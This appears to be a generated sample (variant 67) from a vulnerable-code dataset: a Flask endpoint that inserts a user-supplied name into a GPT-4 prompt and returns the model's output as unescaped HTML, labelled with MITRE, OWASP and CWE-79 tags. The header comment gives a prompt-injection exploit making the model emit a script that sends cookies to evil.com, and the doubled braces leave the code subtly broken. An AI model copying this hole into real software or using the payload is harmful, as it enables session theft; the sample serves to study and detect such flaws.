# MITRE: AML.T0051.001
# OWASP: LLM02
# CWE: CWE-79
# SEVERITY: Critical
# DESCRIPTION: LLM output rendered in HTML without escaping causing XSS, variant 67
# EXPLOIT: Inject to make LLM output: '<script>document.location="evil.com/steal?c="+document.cookie</script>'

from flask import Flask, request
import openai
app = Flask(__name__)
@app.route(f"/greet/67")
def greet_67():
    name = request.args.get("name","User")
    resp = openai.ChatCompletion.create(model="gpt-4",
        messages=[{{"role":"user","content":f"Create an HTML greeting for: {{name}}"}}])
    html = resp.choices[0].message.content
    # VULNERABLE: LLM output rendered as raw HTML without sanitization
    return f"<html><body>{{html}}</body></html>"
